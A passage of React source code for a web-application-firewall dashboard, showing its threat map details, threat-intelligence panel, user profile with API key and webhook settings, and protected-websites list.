              <Marker
                position={[targetSite.lat, targetSite.lng]}
                icon={L.divIcon({
                  className: 'custom-target-icon',
                  html: `<div class="target-marker-box">
                           <div class="target-radar-ring"></div>
                           <div class="target-radar-ring"></div>
                           <div class="target-radar-ring"></div>
                           <div class="target-radar-core"></div>
                         </div>`,
                  iconSize: [32, 32],
                  iconAnchor: [16, 16]
                })}
              >
                <MapTooltip direction="bottom" offset={[0, 16]}>
                  <div style={{ color: '#00ff9c', fontSize: 12, fontWeight: 700 }}>{targetSite.city}</div>
                  <div style={{ color: 'var(--muted)', fontSize: 10 }}>PROTECTED INFRASTRUCTURE</div>
                </MapTooltip>
              </Marker>
            </MapContainer>

            {/* HUD Overlay */}
            <div className="geo-hud-overlay">
              <div className="geo-hud-grid" />
              <div className="geo-vignette" />
              <div className="geo-radar-sweep" />
            </div>
          </div>

          {/* Attack type legend */}
          <div className="geo-map-legend-bar">
            {Object.entries(TYPE_COLORS).map(([type, color]) => (
              <div className="geo-chip" key={type}>
                <span className="geo-chip-dot" style={{ background: color, '--dot-color': color }} />
                {type}
              </div>
            ))}
            <div style={{ marginLeft: 'auto', fontSize: 10, fontFamily: 'var(--mono)', color: 'var(--muted2)' }}>
              {stats.total} events tracked
            </div>
          </div>
        </div>

        {/* ═══ TWO-COLUMN DETAILS ═══ */}
        <div className="geo-details-grid">
          {/* THREAT ORIGINS TABLE */}
          <div className="geo-origins-card">
            <div className="geo-origins-title">
              <span>Threat Origins</span>
              {selectedLocationKey && (
                <button style={{ background: 'rgba(255,100,100,0.1)', border: '1px solid rgba(255,100,100,0.2)', color: '#ff6b6b', fontSize: 9, padding: '4px 12px', borderRadius: 99, cursor: 'pointer', fontFamily: 'var(--mono)' }} onClick={() => setSelectedLocationKey('')}>CLEAR FILTER</button>
              )}
            </div>

            {/* Protected target */}
            <div className="geo-origin-row geo-origin-target">
              <div className="geo-origin-dot" style={{ background: '#00ff9c', boxShadow: '0 0 8px #00ff9c' }} />
              <div className="geo-origin-info">
                <span className="geo-origin-name">{targetSite.name} ({targetSite.city})</span>
                <span className="geo-origin-coord">{targetSite.lat.toFixed(4)}, {targetSite.lng.toFixed(4)}</span>
              </div>
              <span className="geo-origin-count">TARGET</span>
            </div>

            {/* Origin locations */}
            {locationCounts.slice(0, 8).map((loc, i) => (
              <div
                key={loc.key}
                className="geo-origin-row"
                onClick={() => setSelectedLocationKey((curr) => (curr === loc.key ? '' : loc.key))}
                style={{ opacity: selectedLocationKey && selectedLocationKey !== loc.key ? 0.4 : 1 }}
              >
                <div className="geo-origin-rank">{i + 1}</div>
                <div className="geo-origin-dot" style={{ background: GEO_PALETTE[i % GEO_PALETTE.length], boxShadow: `0 0 6px ${GEO_PALETTE[i % GEO_PALETTE.length]}` }} />
                <div className="geo-origin-info">
                  <span className="geo-origin-name">{loc.city}, {loc.country}</span>
                  <span className="geo-origin-coord">{loc.lat.toFixed(2)}, {loc.lng.toFixed(2)}</span>
                </div>
                <span className="geo-origin-count">{loc.count}</span>
              </div>
            ))}
          </div>

          {/* COUNTRY DISTRIBUTION */}
          <div className="geo-countries-card">
            <div className="geo-origins-title">
              <span>Attack Origin Countries</span>
              <span className="geo-origins-count">{countries.length} nations</span>
            </div>

            {countries.map(([country, count], i) => {
              const color = GEO_PALETTE[i % GEO_PALETTE.length];
              const pct = Math.round((count / Math.max(stats.total, 1)) * 100);
              return (
                <div className="geo-country-row" key={country}>
                  <div className="geo-country-header">
                    <span className="geo-country-name">{country}</span>
                    <span className="geo-country-count" style={{ color }}>{count} <span style={{ fontSize: 9, color: 'var(--muted)' }}>({pct}%)</span></span>
                  </div>
                  <div className="geo-country-bar">
                    <div className="geo-country-fill" style={{ width: `${pct}%`, background: color, '--bar-color': color }} />
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* ═══ LIVE INTELLIGENCE FEED ═══ */}
        <div className="geo-feed-card">
          <div className="geo-origins-title" style={{ marginBottom: 16 }}>
            <span>Live Intelligence Stream</span>
            <span className="geo-origins-count">{stats.total} total intercepted</span>
          </div>

          {filteredLog.slice(0, 10).map((ev) => (
            <div className="geo-feed-row" key={ev.id}>
              <span className="geo-feed-time">{new Date().toISOString().split('T')[1].slice(0, 8)}</span>
              <span className="geo-feed-type" style={{ color: TYPE_COLORS[ev.attack_type] }}>{ev.attack_type}</span>
              <span className="geo-feed-ip">{ev.src_ip}</span>
              <span className="geo-feed-loc">{ev.city || ev.country}</span>
              <span className="geo-feed-status" style={{ background: 'rgba(0,255,156,0.1)', color: '#00ff9c', border: '1px solid rgba(0,255,156,0.2)' }}>BLOCKED</span>
            </div>
          ))}

          {filteredLog.length === 0 && (
            <div style={{ color: 'var(--muted2)', fontSize: 11, fontFamily: 'var(--mono)', textAlign: 'center', padding: 24 }}>
              AWAITING THREAT DATA — Deploy simulation from Fusion Dashboard
            </div>
          )}
        </div>

      </div>
    </MotionDiv>
  );
}

function ThreatIntel() {
  const advisories = engine.getCERTAdvisories();
  const criticalCount = advisories.filter((a) => a.severity === 'CRITICAL').length;
  const highCount = advisories.filter((a) => a.severity === 'HIGH').length;

  const [topThreats, setTopThreats] = useState([]);
  const [ipRep, setIpRep] = useState(null);
  const [ipQuery, setIpQuery] = useState('');
  const [searching, setSearching] = useState(false);

  useEffect(() => {
    fetch(`${API_URL}/threats?limit=5`, {
      headers: { 'X-AutoShield-Key': engine.getSessionKey() }
    }).then(r => r.json()).then(data => {
      setTopThreats(data.threats || []);
    }).catch(console.error);
  }, []);

  const handleIpLookup = async () => {
    if (!ipQuery) return;
    setSearching(true);
    try {
      const res = await fetch(`${API_URL}/threat-score?ip=${encodeURIComponent(ipQuery)}`);
      const data = await res.json();
      setIpRep(data);
    } catch (e) {
      console.error(e);
      setIpRep({ ip: ipQuery, threat_score: 0, threat_label: 'UNKNOWN' });
    } finally {
      setSearching(false);
    }
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px' }}>
        <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>🧠 Threat Intelligence</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>Global intelligence, CVE lookups, and instantaneous IP reputation</p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '24px', marginBottom: 24 }}>
        {/* Left Column */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 24 }}>
          <ThreatIntelTab />

          {/* IP Reputation */}
          <div className="glass-card">
            <div style={{ fontSize: 14, fontWeight: 700, marginBottom: 16 }}>🎯 Real-time IP Reputation</div>
            <div style={{ display: 'flex', gap: 10, marginBottom: 16 }}>
              <input className="input" placeholder="Enter IP Address (e.g. 192.168.1.1)" value={ipQuery} onChange={e => setIpQuery(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && handleIpLookup()} style={{ flex: 1 }} />
              <button className="evolve-btn" onClick={handleIpLookup} disabled={searching}>{searching ? 'SCANNING...' : 'LOOKUP'}</button>
            </div>
            {ipRep && (
              <div style={{ padding: 16, borderRadius: 8, background: 'rgba(255,255,255,0.02)', border: `1px solid ${ipRep.threat_label === 'CRITICAL' ? 'var(--red)' : ipRep.threat_label === 'ELEVATED' ? 'var(--yellow)' : 'var(--green)'}44`, borderLeft: `3px solid ${ipRep.threat_label === 'CRITICAL' ? 'var(--red)' : ipRep.threat_label === 'ELEVATED' ? 'var(--yellow)' : 'var(--green)'}` }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 8 }}>
                  <span style={{ fontFamily: 'monospace', fontSize: 16, fontWeight: 700, color: 'white' }}>{ipRep.ip}</span>
                  <span style={{ fontSize: 11, padding: '4px 10px', borderRadius: 4, background: ipRep.threat_label === 'CRITICAL' ? 'var(--red)' : ipRep.threat_label === 'ELEVATED' ? 'var(--yellow)' : 'var(--green)', color: '#000', fontWeight: 800 }}>{ipRep.threat_label}</span>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                  <span style={{ fontSize: 24, fontFamily: 'Anton', color: ipRep.threat_label === 'CRITICAL' ? 'var(--red)' : ipRep.threat_label === 'ELEVATED' ? 'var(--yellow)' : 'var(--green)' }}>{Math.round(ipRep.threat_score)}</span>
                  <span style={{ fontSize: 11, color: 'var(--e-muted)' }}>THREAT SCORE (0-100 base)</span>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Right Column */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 24 }}>

          {/* Live Top Threats */}
          <div className="glass-card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 }}>
              <div style={{ fontSize: 14, fontWeight: 700 }}>🔥 Live Global Threats</div>
              <span className="neon-pill" style={{ color: 'var(--red)', borderColor: 'rgba(255,77,77,0.3)', padding: '2px 8px', fontSize: 10 }}>GLOBAL API</span>
            </div>
            {topThreats.length === 0 ? <div className="feed-empty">No active top threats identified</div> : topThreats.map((t, idx) => (
              <div key={idx} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 0', borderBottom: '1px solid rgba(255,255,255,0.05)', fontSize: 12 }}>
                <div>
                  <div style={{ fontFamily: 'monospace', color: 'var(--red)', fontSize: 14, fontWeight: 700 }}>{t.ip}</div>
                  <div style={{ color: 'var(--e-muted)', fontSize: 10, marginTop: 4 }}>Last Seen: {t.last_seen ? t.last_seen.slice(11, 19) : 'Unknown'}</div>
                </div>
                <div style={{ textAlign: 'right' }}>
                  <div style={{ color: 'var(--cyan)' }}>{t.count} Hits</div>
                  <div style={{ color: 'var(--yellow)', fontSize: 10 }}>{t.categories}</div>
                </div>
              </div>
            ))}
          </div>

          <div className="glass-card">
            <div style={{ fontSize: 14, fontWeight: 700, marginBottom: 16 }}>🇮🇳 CERT-In Advisories</div>
            <div className="adv-stats" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '12px', marginBottom: '16px' }}>
              <div className="adv-stat" style={{ background: 'rgba(8,11,16,.5)', border: '1px solid var(--cyan)', borderRadius: 10, padding: 12, textAlign: 'center' }}><div style={{ fontSize: 18, fontWeight: 700, fontFamily: 'var(--mono)', color: 'var(--cyan)' }}>{advisories.length}</div><div style={{ fontSize: 9, color: 'var(--muted)', fontFamily: 'var(--mono)' }}>TOTAL</div></div>
              <div className="adv-stat" style={{ background: 'rgba(8,11,16,.5)', border: '1px solid rgba(255,77,77,.4)', borderRadius: 10, padding: 12, textAlign: 'center' }}><div style={{ fontSize: 18, fontWeight: 700, fontFamily: 'var(--mono)', color: 'var(--red)' }}>{criticalCount}</div><div style={{ fontSize: 9, color: 'var(--muted)', fontFamily: 'var(--mono)' }}>CRITICAL</div></div>
              <div className="adv-stat" style={{ background: 'rgba(8,11,16,.5)', border: '1px solid rgba(255,139,91,.4)', borderRadius: 10, padding: 12, textAlign: 'center' }}><div style={{ fontSize: 18, fontWeight: 700, fontFamily: 'var(--mono)', color: 'var(--orange)' }}>{highCount}</div><div style={{ fontSize: 9, color: 'var(--muted)', fontFamily: 'var(--mono)' }}>HIGH</div></div>
            </div>
            {advisories.map((a) => {
              const ac = { CRITICAL: 'var(--red)', HIGH: 'var(--orange)', MEDIUM: 'var(--yellow)' }[a.severity] || 'var(--muted)';
              return (
                <div className="adv-card" key={a.id} style={{ background: 'rgba(8,11,16,.5)', borderLeft: `3px solid ${ac}`, padding: '12px', borderRadius: 8, marginBottom: 8, borderTop: '1px solid rgba(255,255,255,0.05)', borderBottom: '1px solid rgba(255,255,255,0.05)', borderRight: '1px solid rgba(255,255,255,0.05)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: 10, fontWeight: 700, color: ac, fontFamily: 'var(--mono)' }}>{a.id}</span>
                    <span style={{ background: `${ac}18`, color: ac, border: `1px solid ${ac}44`, padding: '2px 8px', borderRadius: 4, fontSize: 9, fontFamily: 'var(--mono)', fontWeight: 700 }}>{a.severity}</span>
                  </div>
                  <div style={{ fontSize: 12, color: 'var(--text)', marginTop: 8 }}>{a.title}</div>
                  <div style={{ fontSize: 10, color: 'var(--muted)', marginTop: 6, lineHeight: 1.4 }}>{a.desc}</div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </MotionDiv>
  );
}

function Profile() {
  const { user } = useAuth();
  const [biometricEnabled, setBiometricEnabled] = useState(false);
  const [showKey, setShowKey] = useState(false);
  const [recoveryCodes, setRecoveryCodes] = useState([]);
  const masterKey = engine.getMasterIngestionKey(user);

  const stats = [
    { label: 'Security Clearance', value: 'Level 5 (Elite)', color: 'var(--cyan)', icon: <HiOutlineShieldCheck /> },
    { label: 'Active Sessions', value: '2 Nodes', color: 'var(--green)', icon: <HiOutlineServerStack /> },
    { label: 'Reputation Score', value: '99.9%', color: 'var(--cyan)', icon: <HiOutlineFingerPrint /> },
  ];

  const activities = [
    { time: '10m ago', action: 'API Key Rotated', status: 'SUCCESS' },
    { time: '2h ago', action: 'Global Map Export', status: 'SUCCESS' },
    { time: '5h ago', action: 'Auth Bypass Attempt', status: 'BLOCKED' },
    { time: 'Yesterday', action: 'System Audit Run', status: 'SUCCESS' },
  ];

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      {/* Header with Glass Gradient */}
      <div style={{
        position: 'relative',
        padding: '60px 40px',
        borderRadius: '24px',
        background: 'linear-gradient(135deg, rgba(56,189,248,0.05) 0%, rgba(106,92,255,0.05) 100%)',
        border: '1px solid rgba(255,255,255,0.03)',
        marginBottom: '40px',
        overflow: 'hidden'
      }}>
        <div style={{ position: 'absolute', top: '-100px', right: '-100px', width: '300px', height: '300px', background: 'radial-gradient(circle, rgba(0,200,255,0.1) 0%, transparent 70%)', filter: 'blur(40px)' }} />

        <div style={{ display: 'flex', alignItems: 'center', gap: '32px', position: 'relative', zIndex: 1 }}>
          <div style={{
            width: '100px', height: '100px',
            borderRadius: '50%',
            background: 'linear-gradient(135deg, #1C2535 0%, #09090B 100%)',
            border: '2px solid rgba(255,255,255,0.05)',
            boxShadow: '0 0 40px rgba(0,0,0,0.5)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            fontSize: '32px', fontWeight: 'bold', color: 'var(--cyan)',
            fontFamily: 'Anton'
          }}>
            {user?.username?.slice(0, 2).toUpperCase()}
          </div>
          <div>
            <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '48px', margin: 0, textTransform: 'uppercase', lineHeight: 0.9 }}>
              {user?.username?.split('@')[0]}
            </h1>
            <div style={{ display: 'flex', gap: '12px', marginTop: '16px' }}>
              <span className="neon-pill" style={{ borderColor: 'rgba(56,189,248,0.3)', color: 'var(--cyan)' }}>
                <HiOutlineIdentification style={{ marginRight: 6 }} /> {user?.role || 'System Administrator'}
              </span>
              <span className="neon-pill" style={{ borderColor: 'rgba(34,197,94,0.3)', color: 'var(--green)' }}>
                <HiShieldCheck style={{ marginRight: 6 }} /> Verified Enterprise Node
              </span>
            </div>
          </div>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.5fr', gap: '24px', marginBottom: '24px' }}>
        {/* Profile Details */}
        <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          <div style={{ fontSize: 13, fontWeight: 700, letterSpacing: '2px', color: 'var(--e-muted)', fontFamily: 'monospace' }}>IDENTITY CONFIGURATION</div>

          <div style={{ display: 'grid', gap: '20px' }}>
            <div className="profile-field">
              <label style={{ fontSize: 10, color: 'var(--e-muted)', display: 'block', marginBottom: 8, fontFamily: 'monospace' }}>MASTER ID</label>
              <div style={{ fontFamily: 'var(--mono)', color: 'white', fontSize: 13 }}>USR-{(user?.username || 'admin').split('').reduce((a, c) => ((a << 5) - a + c.charCodeAt(0)) | 0, 0).toString(16).replace('-', '').slice(0, 6).toUpperCase()}</div>
            </div>
            <div className="profile-field">
              <label style={{ fontSize: 10, color: 'var(--e-muted)', display: 'block', marginBottom: 8, fontFamily: 'monospace' }}>RECOVER EMAIL</label>
              <div style={{ color: 'white', fontSize: 14 }}>{user?.email || 'izumi.admin@autoshield.ai'}</div>
            </div>
            <div className="profile-field">
              <label style={{ fontSize: 10, color: 'var(--e-muted)', display: 'block', marginBottom: 8, fontFamily: 'monospace' }}>AUTH METHOD</label>
              <div style={{ color: 'var(--cyan)', fontSize: 13, fontFamily: 'var(--mono)', display: 'flex', alignItems: 'center', gap: 8 }}>
                {user?.authMethod === 'google' ? (
                  <><svg width="14" height="14" viewBox="0 0 24 24" style={{ verticalAlign: 'middle' }}><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" /><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" /><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" /><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" /></svg> Google OAuth 2.0</>
                ) : 'Enterprise SSO'}
              </div>
            </div>
            <div className="profile-field">
              <label style={{ fontSize: 10, color: 'var(--e-muted)', display: 'block', marginBottom: 8, fontFamily: 'monospace' }}>SUBSCRIPTION TIER</label>
              <div style={{ fontSize: 13, fontFamily: 'var(--mono)', color: engine.isPremium() ? '#ffd700' : 'var(--muted)' }}>
                {engine.isPremium() ? '⭐ Premium Enterprise' : '📦 Free Tier'}
              </div>
            </div>
          </div>

          <div style={{ marginTop: 'auto', padding: '16px', background: 'rgba(255,255,255,0.02)', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.03)' }}>
            <div style={{ fontSize: 11, fontWeight: 600, color: 'var(--e-muted)', marginBottom: 12 }}>QUICK MONITORING</div>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '12px' }}>
              {stats.map((s, i) => (
                <div key={i} style={{ textAlign: 'center' }}>
                  <div style={{ fontSize: 16, color: s.color, marginBottom: 4 }}>{s.icon}</div>
                  <div style={{ fontSize: 10, fontWeight: 700 }}>{s.value}</div>
                </div>
              ))}
            </div>
          </div>
        </div>

        {/* API & Controls */}
        <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ fontSize: 13, fontWeight: 700, letterSpacing: '2px', color: 'var(--e-muted)', fontFamily: 'monospace' }}>API ACCESS INTERFACE</div>
            <div className="neon-pill" style={{ fontSize: 10 }}>V2.0 STABLE</div>
          </div>

          <div style={{ padding: '24px', background: '#09090B', borderRadius: '12px', border: '1px solid rgba(0,255,156,0.1)', flex: 1 }}>
            <div style={{ marginBottom: 24 }}>
              <div style={{ fontSize: 10, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'monospace' }}>MASTER INGESTION KEY</div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <div style={{
                  flex: 1,
                  padding: '12px 16px',
                  background: 'rgba(0,0,0,0.5)',
                  border: '1px solid rgba(255,255,255,0.05)',
                  borderRadius: '8px',
                  color: showKey ? 'var(--green)' : 'rgba(34,197,94,0.1)',
                  fontFamily: 'monospace',
                  fontSize: 13,
                  filter: showKey ? 'none' : 'blur(4px)',
                  transition: 'all 0.3s'
                }}>
                  {masterKey}
                </div>
                <button className="evolve-button-secondary" style={{ fontSize: 11, padding: '8px 16px', borderRadius: 6 }} onClick={() => setShowKey(!showKey)}>
                  {showKey ? 'HIDE' : 'REVEAL'}
                </button>
              </div>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
              <div style={{ padding: '16px', borderRadius: '8px', border: '1px dashed rgba(255,255,255,0.1)' }}>
                <div style={{ fontSize: 10, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'monospace' }}>IP WHITELIST</div>
                <div style={{ fontSize: 12, color: 'white' }}>1 Node Active</div>
              </div>
              <div style={{ padding: '16px', borderRadius: '8px', border: '1px dashed rgba(255,255,255,0.1)' }}>
                <div style={{ fontSize: 10, color: 'var(--e-muted)', marginBottom: 8, fontFamily: 'monospace' }}>USAGE QUOTA</div>
                <div style={{ fontSize: 12, color: 'white' }}>Unlimited</div>
              </div>
            </div>

            <div style={{ marginTop: '24px' }}>
              <button className="evolve-button-primary" style={{ width: '100%', height: '44px', borderRadius: '8px' }} onClick={() => {
                navigator.clipboard?.writeText(masterKey);
                alert('Active ingestion key copied to clipboard. Rotate keys from backend key management before production use.');
              }}>
                COPY ACTIVE KEY <HiOutlineKey style={{ marginLeft: 8 }} />
              </button>
              <p style={{ marginTop: '12px', fontSize: '11px', color: 'var(--e-muted)', textAlign: 'center' }}>
                Key rotations are logged and broadcasted to edge nodes.
              </p>
            </div>
          </div>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '24px' }}>
        {/* Security Log */}
        <div className="glass-card">
          <div style={{ fontSize: 13, fontWeight: 700, letterSpacing: '2px', color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 20 }}>RECENT ADMINISTRATIVE ACTIVITY</div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '1px', background: 'rgba(255,255,255,0.05)', borderRadius: '8px', overflow: 'hidden' }}>
            {activities.map((act, i) => (
              <div key={i} style={{ display: 'flex', alignItems: 'center', padding: '14px 20px', background: 'var(--surface)', gap: '20px' }}>
                <div style={{ fontSize: 11, color: 'var(--e-muted)', width: '80px', fontFamily: 'monospace' }}>{act.time}</div>
                <div style={{ flex: 1, fontSize: 13, fontWeight: 600 }}>{act.action}</div>
                <div style={{
                  fontSize: 10,
                  fontWeight: 700,
                  color: act.status === 'SUCCESS' ? 'var(--green)' : 'var(--red)',
                  padding: '2px 8px',
                  background: act.status === 'SUCCESS' ? 'rgba(34,197,94,0.1)' : 'rgba(239,68,68,0.1)',
                  borderRadius: '4px'
                }}>{act.status}</div>
              </div>
            ))}
          </div>
        </div>

        {/* Account Security */}
        <div className="glass-card">
          <div style={{ fontSize: 13, fontWeight: 700, letterSpacing: '2px', color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 20 }}>ACCOUNT HARDENING</div>
          <div style={{ display: 'grid', gap: '16px' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <HiOutlineLockClosed style={{ color: 'var(--green)', fontSize: 18 }} />
                <div style={{ fontSize: 12, fontWeight: 600 }}>2FA Verification</div>
              </div>
              <span style={{ color: 'var(--green)', fontSize: 11, fontWeight: 700 }}>ACTIVE</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '8px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                <HiOutlineFingerPrint style={{ color: 'var(--cyan)', fontSize: 18 }} />
                <div style={{ fontSize: 12, fontWeight: 600 }}>Biometric Entry</div>
              </div>
              <button className="evolve-button-secondary" style={{ padding: '4px 10px', fontSize: 11, borderRadius: 6 }} onClick={() => setBiometricEnabled(!biometricEnabled)}>
                {biometricEnabled ? 'ENABLED' : 'UNSET'}
              </button>
            </div>
            <button className="evolve-button-secondary" style={{ width: '100%', height: '40px', fontSize: 12, borderRadius: 8 }} onClick={() => setRecoveryCodes(Array.from({ length: 6 }, () => Math.random().toString(36).slice(2, 8).toUpperCase()))}>
              VIEW RECOVERY CODES
            </button>
            {recoveryCodes.length > 0 && (
              <div style={{ fontSize: 11, color: 'var(--e-muted)', fontFamily: 'var(--mono)', display: 'grid', gap: 4 }}>
                {recoveryCodes.map((code) => <div key={code}>{code}</div>)}
              </div>
            )}
          </div>
        </div>

        {/* Webhook SIEM Integration */}
        <div className="glass-card">
          <div style={{ fontSize: 13, fontWeight: 700, letterSpacing: '2px', color: 'var(--e-muted)', fontFamily: 'monospace', marginBottom: 20 }}>SIEM WEBHOOK ROUTING</div>
          <p style={{ fontSize: 11, color: 'var(--e-muted)', marginBottom: 20, lineHeight: 1.5 }}>
            Push live security events directly to your Splunk, Datadog, or Elasticsearch instances.
          </p>
          <div style={{ display: 'grid', gap: '16px' }}>
            <div>
              <label style={{ fontSize: 10, color: 'var(--cyan)', display: 'block', marginBottom: 8, fontFamily: 'monospace' }}>TARGET MUTATION URL</label>
              <input id="webhook-url" className="input" placeholder="https://api.datadoghq.com/api/v1/events" style={{ width: '100%' }} />
            </div>
            <div>
              <label style={{ fontSize: 10, color: 'var(--cyan)', display: 'block', marginBottom: 8, fontFamily: 'monospace' }}>AUTHENTICATION BEARER</label>
              <input id="webhook-auth" className="input" type="password" placeholder="xoxb-..." style={{ width: '100%' }} />
            </div>
            <button className="evolve-btn" style={{ width: '100%' }} onClick={async () => {
              const url = document.getElementById('webhook-url')?.value;
              const auth = document.getElementById('webhook-auth')?.value;
              if (!url) { alert('Target URL is required'); return; }

              const siteId = user?.site_id || 'site_demo';
              const res = await engine.registerWebhook(siteId, {
                url,
                name: url.includes('datadog') ? 'Datadog SIEM' : url.includes('splunk') ? 'Splunk SOC' : 'External SIEM',
                auth
              });

              if (res.success) {
                alert('Webhook securely registered. Sending heartbeat ping.');
                const u = document.getElementById('webhook-url'); if (u) u.value = '';
                const a = document.getElementById('webhook-auth'); if (a) a.value = '';
              } else {
                alert(res.error || 'Enterprise Subscription required.');
              }
            }}>REGISTER LIVE WEBHOOK</button>
          </div>
        </div>
      </div>
    </MotionDiv>
  );
}

function MyWebsites() {
  const navigate = useNavigate();
  useEngineSnapshot(() => engine.getStateVersion());
  const sites = engine.getDomains();
  const [confirmRemove, setConfirmRemove] = useState(null);
  const [wafTestResults, setWafTestResults] = useState({}); // { siteId: result }
  const [wafTesting, setWafTesting] = useState({});  // { siteId: bool }

  useEffect(() => {
    let cancelled = false;
    const refreshAllHealth = async () => {
      const probes = sites.map((site) => engine.refreshSiteHealth(site.id, site.domain));
      await Promise.allSettled(probes);
    };
    refreshAllHealth();
    const intervalId = setInterval(() => {
      if (!cancelled) refreshAllHealth();
    }, 8000);
    return () => { cancelled = true; clearInterval(intervalId); };
  }, [sites.length]);

  const handleTestWAF = async (site) => {
    setWafTesting(prev => ({ ...prev, [site.id]: true }));
    try {
      const res = await fetch(`${API_URL}/api/websites/${site.id}/test-attack`, {
        method: 'POST',
        headers: { 'X-AutoShield-Key': engine.getSessionKey(), 'Content-Type': 'application/json' },
        body: JSON.stringify({ attack_type: 'SQLi' }),
      });
      const data = await res.json();
      setWafTestResults(prev => ({ ...prev, [site.id]: data }));
    } catch (e) {
      setWafTestResults(prev => ({ ...prev, [site.id]: { error: 'Test failed: ' + e.message } }));
    } finally {
      setWafTesting(prev => ({ ...prev, [site.id]: false }));
    }
  };

  const handleRemove = (index) => {
    engine.removeDomain(index);
    setConfirmRemove(null);
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px' }}>
        <div>
          <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>My Websites</h1>
          <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>All domains under AutoShield WAF protection</p>
        </div>
        <Link to="/setup" className="evolve-btn" style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '10px 24px', fontSize: 13 }}>+ Add Website</Link>
      </div>

      {/* Protection model explainer */}
      <div style={{ marginBottom: 24, padding: '14px 20px', background: 'rgba(56,189,248,0.05)', border: '1px solid rgba(56,189,248,0.15)', borderRadius: 10, fontSize: 12, color: 'rgba(255,255,255,0.6)', lineHeight: 1.7 }}>
        <strong style={{ color: 'var(--cyan)' }}>🛡️ How AutoShield Protection Works</strong><br />
        Traffic hits <code style={{ color: 'var(--green)' }}>{API_URL}/proxy</code> → WAF inspects → if clean, forwards to your <strong>Upstream URL</strong>.
        Set the upstream URL in setup, or click <strong>Manage</strong> to configure it. Use <strong>Test WAF</strong> to verify real-time blocking is active.
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
        {sites.map((site, i) => {
          const siteUrl = formatSiteUrl(site.domain);
          const health = engine.getSiteHealth(site.id, site.domain);
          const statusLabel = health.status || 'UNKNOWN';
          const isNotConfigured = statusLabel === 'NOT_CONFIGURED';
          const statusColor = statusLabel === 'UP' ? 'var(--green)' : statusLabel === 'DEGRADED' ? 'var(--yellow)' : isNotConfigured ? 'var(--e-muted)' : statusLabel === 'DOWN' ? 'var(--red)' : 'var(--e-muted)';
          const wafResult = wafTestResults[site.id];
          const testing = wafTesting[site.id];

          return (
            <div key={i} className="glass-card" style={{ position: 'relative', padding: '20px 24px' }}>
              {confirmRemove === i && (
